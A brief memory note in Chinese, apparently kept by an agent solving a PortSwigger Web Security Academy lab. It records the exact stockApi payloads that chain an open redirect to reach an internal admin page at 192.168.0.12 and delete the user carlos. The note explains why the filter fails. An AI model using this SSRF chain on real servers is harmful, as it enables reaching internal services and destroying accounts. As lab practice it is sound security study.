---
metadata:
  node_type: memory
name: "SSRF open redirect filter bypass"
description: "SSRF 过滤器绕过开放重定向:stockApi 走 /product/nextProduct 两跳删 carlos,一次成形"
last_updated: 2026-10-10T12:57:50+08:00
created: 2026-10-10T12:57:50+08:00
---

## 2026-07-05 lab-ssrf-filter-bypass-via-open-redirection (arm A, solved)

- 实例 0a20006604d5273580795db300cd00f7.web-security-academy.net,jar /tmp/cj1.json(range_launch launch-url 直接吃 canonical 路径;首次 launch 子命令落到 login.portswigger.net,换 launch-url 形即成功)。
- 读面即方法:stock check 表单 POST /product/stock,参数 stockApi 取值本是相对路径(如 /product/stock/check?productId=1&storeId=1);同页有开放重定向 /product/nextProduct?currentProductId=1&path=...。
- 利用:stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin 先证实服务端跟随 302 取到 admin 页;再 path=http://192.168.0.12:8080/admin/delete?username=carlos,响应 User deleted successfully!。banner_verdict solved=true。
- 要点:过滤器只校验 stockApi 前缀是否本地,重定向在服务端 fetch 里被跟随,故相对路径即可触达内网;两步(先读 admin 证实可达,再打 delete)比一步盲打更可判。

